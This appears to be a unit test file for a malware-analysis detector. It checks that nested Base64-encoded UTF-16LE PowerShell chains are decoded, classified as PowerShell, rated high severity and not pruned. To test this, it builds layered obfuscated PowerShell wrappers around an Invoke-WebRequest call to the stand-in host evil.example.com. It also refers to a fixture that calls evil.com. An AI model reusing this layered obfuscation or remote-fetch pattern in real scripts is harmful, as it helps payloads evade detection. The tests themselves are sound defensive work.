'use strict';
// encoded-recursive-utf16le.test.js — recursive Base64-of-UTF-16LE PowerShell
// chains must unwrap, classify as PowerShell, and survive the prune pass.
//
// Regression: a real-world recursive PowerShell sample of the shape
//
//   Invoke-Command -ScriptBlock(
//     [scriptblock]::Create(
//       [System.Text.Encoding]::Unicode.GetString(
//         [System.Convert]::FromBase64String("…")
//       )))
//
// nested 4-5 deep produced ZERO encoded-content findings before this change.
// Three independent bugs combined to make every layer invisible:
//
//   1. The recursion driver only tried `_tryDecodeUTF8` before recursing.
//      UTF-16LE bytes (every other byte 0x00) fail fatal UTF-8, so layers
//      2..N never entered the inner detector.
//   2. The PowerShell TEXT_SIGNATURE only matched `^$Var`, `^function`,
//      `^param(`. A payload starting with `Invoke-Command` / `IEX` /
//      `[scriptblock]::Create` fell through to generic 'UTF-16LE Text',
//      severity=info, and got pruned.
//   3. Prune Rule 5 (exec-intent keyword fallback) only consulted
//      `_tryDecodeUTF8(decodedBytes)`. UTF-16LE bytes were silently
//      invisible to the retention check.
//
// On top of those correctness bugs, the secondary-finder budget was per-layer,
// so a 5-deep chain could burn 5 × 2.5 s = 12.5 s of regex backtracking on
// the same shape of input at every depth. The cumulative-budget fix shares
// one wall-clock budget across the entire recursion tree.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

// Load the full encoded-content stack — every decoder module that mounts
// methods onto `EncodedContentDetector.prototype` via Object.assign. The
// load order mirrors `JS_FILES` in scripts/build.py.
const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/xor-bruteforce.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/base64-hex.js',
  'src/decoders/zlib.js',
  'src/decoders/encoding-finders.js',
  'src/decoders/encoding-decoders.js',
  'src/decoders/cmd-obfuscation.js',
  'src/decoders/ps-mini-evaluator.js',
  'src/decoders/js-assembly.js',
  'src/decoders/interleaved-separator.js',
]);
const { EncodedContentDetector } = ctx;

// ── Helpers ────────────────────────────────────────────────────────────────

/** Encode an ASCII string as UTF-16LE bytes (every other byte 0x00). */
function toUTF16LE(str) {
  const out = new Uint8Array(str.length * 2);
  for (let i = 0; i < str.length; i++) {
    out[i * 2]     = str.charCodeAt(i) & 0xFF;
    out[i * 2 + 1] = (str.charCodeAt(i) >> 8) & 0xFF;
  }
  return out;
}

/** Standard browser-style base64 of a Uint8Array, using Buffer in Node. */
function bytesToBase64(bytes) {
  return Buffer.from(bytes).toString('base64');
}

// ── Patch 2 — broadened PowerShell TEXT_SIGNATURE ─────────────────────────

test('TEXT_SIGNATURE: PowerShell pattern matches Invoke-Command', () => {
  // Decoded UTF-16LE payload starts with `Invoke-Command -ScriptBlock(…)` —
  // before the broadening this fell through to 'UTF-16LE Text'.
  const psSig = EncodedContentDetector.TEXT_SIGNATURES.find(s => s.type === 'PowerShell');
  assert.ok(psSig, 'PowerShell TEXT_SIGNATURE entry must exist');
  assert.ok(psSig.pattern.test('Invoke-Command -ScriptBlock(...)'),
    'must match Invoke-Command');
  assert.ok(psSig.pattern.test('IEX (Get-Process | Out-String)'),
    'must match IEX');
  assert.ok(psSig.pattern.test('[scriptblock]::Create($x)'),
    'must match [scriptblock]::Create');
  assert.ok(psSig.pattern.test('[System.Convert]::FromBase64String("...")'),
    'must match [System.Convert] static call');
  assert.ok(psSig.pattern.test('[System.Text.Encoding]::Unicode.GetString(...)'),
    'must match [System.Text.Encoding] static call');
  assert.ok(psSig.pattern.test('Get-Process | Out-String'),
    'must match Get-Verb cmdlets');
  // Original anchors must still work.
  assert.ok(psSig.pattern.test('$x = 1'),                'must still match $Var');
  assert.ok(psSig.pattern.test('function Foo { }'),       'must still match function');
  assert.ok(psSig.pattern.test('param($a)'),              'must still match param(');
});

test('TEXT_SIGNATURE: PowerShell pattern does NOT trigger on plain English text', () => {
  // FP guard — the broadened regex must not match arbitrary text.
  const psSig = EncodedContentDetector.TEXT_SIGNATURES.find(s => s.type === 'PowerShell');
  assert.ok(!psSig.pattern.test('Hello world this is a sentence'),
    'plain text must not match');
  assert.ok(!psSig.pattern.test('foo bar baz qux'),
    'plain text must not match');
  // The `^` anchor means a cmdlet in the middle of text doesn't trigger.
  assert.ok(!psSig.pattern.test('see Invoke-Command for details'),
    'cmdlet not at start must not match');
});

test('_classify: classifies UTF-16LE Invoke-Command as PowerShell (UTF-16LE)', () => {
  const d = new EncodedContentDetector();
  const psText = 'Invoke-Command -ScriptBlock([scriptblock]::Create("Hello"))';
  const bytes = toUTF16LE(psText);
  const result = d._classify(bytes);
  assert.equal(result.type, 'PowerShell (UTF-16LE)',
    'must classify as PowerShell (UTF-16LE), not generic UTF-16LE Text');
  assert.equal(result.ext, '.ps1');
});

test('_assessSeverity: PowerShell (UTF-16LE) classification is "high"', () => {
  // Severity escalation depends on the type string containing 'powershell'.
  // The broadened classification carrying ' (UTF-16LE)' suffix must still
  // contain 'powershell' for the includes() check in _assessSeverity.
  const d = new EncodedContentDetector();
  const bytes = toUTF16LE('Invoke-Command -ScriptBlock(...)');
  const cls = d._classify(bytes);
  const sev = d._assessSeverity(cls, [], bytes);
  assert.equal(sev, 'high',
    'PowerShell classifications must escalate to high severity');
});

// ── Patch 3 — UTF-16LE fallback in prune Rule 5 ──────────────────────────

test('_shouldRetainFinding: retains UTF-16LE bytes containing exec-intent keyword', () => {
  // Belt-and-braces case: even if classification regresses someday, exec-
  // intent vocabulary in UTF-16LE bytes must keep the finding alive.
  const d = new EncodedContentDetector();
  const bytes = toUTF16LE('totally generic text Invoke-WebRequest more text');
  const finding = {
    severity: 'info',                                  // Rule 1 fails
    iocs: [],                                          // Rule 2 fails
    classification: { type: 'UTF-16LE Text', ext: '.txt' },  // Rule 3 fails (not in retain list)
    encoding: 'Base64',                                // Rule 4 fails (not cmd-obfuscation)
    decodedBytes: bytes,                               // Rule 5 — must hit via UTF-16LE fallback
    chain: ['Base64', 'UTF-16LE Text'],
    innerFindings: [],                                 // Rule 6 fails
  };
  assert.equal(d._shouldRetainFinding(finding), true,
    'must retain finding whose UTF-16LE bytes contain exec-intent keywords');
});

test('_shouldRetainFinding: drops UTF-16LE bytes with no exec-intent + no other signal', () => {
  // Negative control — without exec-intent vocabulary in UTF-16LE, the
  // finding should still be pruned. Confirms the fallback is additive,
  // not a blanket "always retain UTF-16LE" rule.
  const d = new EncodedContentDetector();
  const bytes = toUTF16LE('plain harmless text with no execution vocabulary at all');
  const finding = {
    severity: 'info',
    iocs: [],
    classification: { type: 'UTF-16LE Text', ext: '.txt' },
    encoding: 'Base64',
    decodedBytes: bytes,
    chain: ['Base64', 'UTF-16LE Text'],
    innerFindings: [],
  };
  assert.equal(d._shouldRetainFinding(finding), false,
    'must drop finding with no signal in any text representation');
});

// ── Patch 1 — UTF-16LE-aware recursion (full pipeline) ───────────────────

test('scan: 3-layer Base64-of-UTF-16LE PowerShell chain unwraps fully', async () => {
  // Build innermost → outermost. Each layer wraps the previous in
  // `[Convert]::FromBase64String("<base64 of UTF-16LE bytes>")` shape so
  // `_isPowerShellEncodedCommand` (whitelist.js) flags every Base64 blob
  // with `psContext=true`, bypassing entropy / identifier gates.
  const innermost = 'Invoke-WebRequest -Uri http://evil.example.com/x.ps1';
  let payload = innermost;
  for (let i = 0; i < 3; i++) {
    const utf16leBytes = toUTF16LE(payload);
    const b64 = bytesToBase64(utf16leBytes);
    // Wrap in the canonical recursion shape. The leading
    // `Invoke-Command -ScriptBlock(...)` keeps the OUTER layer
    // recognisably PowerShell to the parent renderer; the
    // `FromBase64String` literal is what `_isPowerShellEncodedCommand`
    // looks for in the 120-char lookback ahead of the Base64 blob.
    payload =
      'Invoke-Command -ScriptBlock([scriptblock]::Create(' +
      '[System.Text.Encoding]::Unicode.GetString(' +
      '[System.Convert]::FromBase64String("' + b64 + '"))))';
  }

  const d = new EncodedContentDetector();
  const rawBytes = new Uint8Array(Buffer.from(payload, 'utf8'));
  const findings = await d.scan(payload, rawBytes, { fileType: 'powershell' });

  // Sanity: at least one top-level finding survived the prune pass.
  const top = findings.filter(f => f.encoding === 'Base64');
  assert.ok(top.length > 0,
    'top-level Base64 finding must survive pruning (was dropped in all 3 bugs combined)');

  const root = top[0];
  // Each finding's `chain` describes ITS OWN encoding+classification
  // pair (e.g. ['Base64', 'PowerShell (UTF-16LE)']). Recursion depth is
  // expressed via `innerFindings`, not by lengthening the parent chain.
  // Walk the innerFindings list and count layers — pre-fix this was
  // always 0 because UTF-16LE bytes never entered the inner detector.
  assert.ok(root.chain.includes('PowerShell (UTF-16LE)'),
    `root chain should classify decoded layer as PowerShell (UTF-16LE), got ${JSON.stringify(root.chain)}`);

  function depth(f) {
    if (!f.innerFindings || f.innerFindings.length === 0) return 1;
    return 1 + Math.max(...f.innerFindings.map(depth));
  }
  const totalDepth = depth(root);
  assert.ok(totalDepth >= 3,
    `recursion depth should be >= 3, got ${totalDepth} (innerFindings tree)`);

  // Chain monotonicity: every descendant's chain MUST be strictly longer
  // than its parent's. Previously the chain-prepend loop only mutated
  // direct children, so grandchildren capped at a 3-element chain
  // [parent, self, classifier] no matter how deep — visually capping the
  // sidebar's "N layers" badge at 2.
  function assertChainGrows(f, parentLen, path) {
    assert.ok(Array.isArray(f.chain) && f.chain.length > parentLen,
      `chain.length must grow at every recursion step. ` +
      `at ${path}: parent had ${parentLen}, child has ${(f.chain || []).length} (${JSON.stringify(f.chain)})`);
    if (Array.isArray(f.innerFindings)) {
      for (let i = 0; i < f.innerFindings.length; i++) {
        assertChainGrows(f.innerFindings[i], f.chain.length, `${path}.innerFindings[${i}]`);
      }
    }
  }
  // `root` is a top-level finding with no parent prefix — its own chain
  // is the baseline (length=2: [encoding, classification]). Each child
  // must add at least one element.
  if (Array.isArray(root.innerFindings)) {
    for (let i = 0; i < root.innerFindings.length; i++) {
      assertChainGrows(root.innerFindings[i], root.chain.length, `root.innerFindings[${i}]`);
    }
  }

  // Walk to the deepest leaf and confirm it also classifies as
  // PowerShell (UTF-16LE) — proves the broadened TEXT_SIGNATURE catches
  // the cmdlet-only innermost layer too (`Invoke-WebRequest -Uri ...`).
  let leaf = root;
  while (leaf.innerFindings && leaf.innerFindings.length > 0) {
    leaf = leaf.innerFindings[0];
  }
  assert.equal(leaf.classification && leaf.classification.type, 'PowerShell (UTF-16LE)',
    `innermost layer should classify as PowerShell (UTF-16LE), got ${JSON.stringify(leaf.classification)}`);

  // The deepest leaf should have a chain reflecting every ancestor encoding
  // hop plus its own classifier. With 3 nested Base64 layers, leaf.chain
  // must be at least [Base64, Base64, Base64, classifier] = 4 elements.
  assert.ok(leaf.chain.length >= 4,
    `leaf.chain must reflect every ancestor encoding hop, got ${JSON.stringify(leaf.chain)} (length ${leaf.chain.length})`);

  // The innermost `Invoke-WebRequest -Uri http://evil.example.com/...`
  // line surfaces a URL IOC. `_propagateInnerFindings` should bubble it
  // (and its severity) up to the root.
  const rootIocs = (root.iocs || []).map(i => i.url);
  assert.ok(rootIocs.some(u => u.includes('evil.example.com')),
    `root IOC list should include the innermost URL, got ${JSON.stringify(rootIocs)}`);
  assert.equal(root.severity, 'high',
    `root severity should be high (PowerShell classification + URL IOC), got '${root.severity}'`);
});

test('scan: cumulative finder budget — child detectors share parent budget', async () => {
  // Build a 2-layer chain so we hit at least one recursion. The shared
  // budget object lives on `_finderBudget`; child detectors created by
  // `_processCandidate` must reference the SAME object, not copies.
  const inner = 'Get-Process | Out-String';
  const utf16le = toUTF16LE(inner);
  const b64Inner = bytesToBase64(utf16le);
  const layer1 =
    'Invoke-Command -ScriptBlock([scriptblock]::Create(' +
    '[System.Text.Encoding]::Unicode.GetString(' +
    '[System.Convert]::FromBase64String("' + b64Inner + '"))))';
  const utf16leOuter = toUTF16LE(layer1);
  const b64Outer = bytesToBase64(utf16leOuter);
  const payload =
    'Invoke-Command -ScriptBlock([scriptblock]::Create(' +
    '[System.Text.Encoding]::Unicode.GetString(' +
    '[System.Convert]::FromBase64String("' + b64Outer + '"))))';

  const d = new EncodedContentDetector();
  // Sanity: budget object doesn't exist before scan().
  assert.equal(d._finderBudget, null,
    'parent _finderBudget must be null before scan() runs');
  const rawBytes = new Uint8Array(Buffer.from(payload, 'utf8'));
  await d.scan(payload, rawBytes, { fileType: 'powershell' });

  // After scan(), the parent's budget object must be populated with a
  // start timestamp — confirming the lazy-init path ran on the root.
  assert.ok(d._finderBudget && typeof d._finderBudget.start === 'number',
    '_finderBudget must be populated after scan()');
  assert.ok(typeof d._finderBudget.ms === 'number' && d._finderBudget.ms > 0,
    '_finderBudget.ms must be a positive number');
  // The shared object structure must include the contract fields used by
  // `_runFinder` so child detectors can mutate it in place.
  assert.ok('exhausted' in d._finderBudget,
    'budget must expose an `exhausted` flag');
  assert.ok('reason'    in d._finderBudget,
    'budget must expose a `reason` slot');
});

// ── Fixture-driven test against the shipped recursive-PowerShell sample ──

test('scan: examples/windows-scripts/recursive-powershell.ps1 unwraps deeply', async () => {
  // End-to-end test against the canonical recursive UTF-16LE PowerShell
  // sample shipped under examples/. Pre-fix this surfaced a chain of only
  // ~2 hops because the inner Base64 strings (after one or two peels)
  // shrunk below the default-mode 64-char floor in `_findBase64Candidates`,
  // and recursion silently stopped even though the depth budget had room.
  //
  // The fix combines:
  //   • shape-detected UTF-16LE-first decoding at the recursion sites
  //     (so the inner detector receives the correct text on the first try);
  //   • a high-confidence rescue pass at minLen=24 in `_findBase64Candidates`
  //     restricted to PowerShell-context / known-prefix matches, which
  //     surfaces inner B64 strings that fall under the default 64-char floor;
  //   • Rule 5's UTF-16LE fallback no longer shadowed by an `else` branch.
  //
  // Expected behaviour after the fix: at least 3 layers of Base64 unwrap,
  // the deepest leaf surfaces an `evil.com` URL IOC, and that IOC is
  // propagated all the way to the root finding.
  const fs = require('node:fs');
  const path = require('node:path');
  const fixturePath = path.join(__dirname, '..', '..', 'examples', 'windows-scripts', 'recursive-powershell.ps1');
  if (!fs.existsSync(fixturePath)) {
    // Fixture is checked-in; if absent the harness is broken — fail loud.
    assert.fail(`fixture missing: ${fixturePath}`);
  }
  const text = fs.readFileSync(fixturePath, 'utf8');
  const rawBytes = new Uint8Array(Buffer.from(text, 'utf8'));

  const d = new EncodedContentDetector();
  const findings = await d.scan(text, rawBytes, { fileType: 'powershell' });

  const top = findings.filter(f => f.encoding === 'Base64');
  assert.ok(top.length > 0,
    `top-level Base64 finding must survive pruning (got ${findings.length} findings of types ${JSON.stringify(findings.map(f => f.encoding))})`);
  const root = top[0];

  function depth(f) {
    if (!f.innerFindings || f.innerFindings.length === 0) return 1;
    return 1 + Math.max(...f.innerFindings.map(depth));
  }
  const totalDepth = depth(root);
  // The sample is a 4–5-layer chain. Allow ≥3 to absorb any fixture drift
  // (the pre-fix value was 2; anything ≥3 proves the floor + decoder
  // ordering bugs are fixed).
  assert.ok(totalDepth >= 3,
    `recursion depth should be >= 3 on real fixture, got ${totalDepth}`);

  // Walk to the deepest leaf and confirm its `chain` reflects EVERY
  // ancestor encoding hop, not just its parent. Pre-fix this capped at
  // 3 elements ([parent, self, classifier]) regardless of nesting depth
  // because the chain-prepend loop only walked direct children. The
  // recursive prepend ensures chain.length grows monotonically with
  // recursion depth, terminating with a (depth+1)-element chain at the
  // deepest leaf (every Base64 hop plus the leaf classifier).
  let leaf = root;
  while (leaf.innerFindings && leaf.innerFindings.length > 0) {
    leaf = leaf.innerFindings[0];
  }
  assert.ok(leaf.chain.length >= 5,
    `deepest leaf chain must reflect every ancestor hop on real fixture, got ${JSON.stringify(leaf.chain)} (length ${leaf.chain.length})`);

  // The innermost layer is `Invoke-Command ... https://evil.com?payload=1234`
  // (or similar). Walk to the deepest leaf via the first inner-finding chain
  // and confirm an evil.com URL IOC bubbled up.
  const rootIocs = (root.iocs || []).map(i => i.url || '');
  assert.ok(rootIocs.some(u => /evil\.com/i.test(u)),
    `root IOC list should include an evil.com URL after IOC propagation, got ${JSON.stringify(rootIocs)}`);

  // Severity escalation: PowerShell classification + URL IOC → high.
  assert.equal(root.severity, 'high',
    `root severity should be 'high' on real fixture, got '${root.severity}'`);
});

test('scan: passing a pre-populated _finderBudget skips root-stub emission', async () => {
  // Simulates the recursion path where a child detector receives the
  // parent's budget. Confirms (a) the constructor accepts the option,
  // (b) the child does not overwrite it, (c) child does not duplicate
  // the diagnostic stub even if the parent already exhausted the budget.
  const sharedBudget = { start: Date.now() - 10_000, ms: 100, exhausted: true, reason: 'test-trigger' };
  const child = new EncodedContentDetector({ _finderBudget: sharedBudget });
  assert.strictEqual(child._finderBudget, sharedBudget,
    'constructor must store the shared budget object by reference');

  // Run a tiny scan in the child. The shared budget is already exhausted,
  // so secondary finders must be skipped, and no `finder-budget` stub
  // should be emitted (only the root scan emits the stub).
  const findings = await child.scan('hello world this is plain text', new Uint8Array(0), {});
  const stubs = findings.filter(f => f.encoding === 'finder-budget');
  assert.equal(stubs.length, 0,
    'child detector must not emit finder-budget stub (only root scan does)');
});
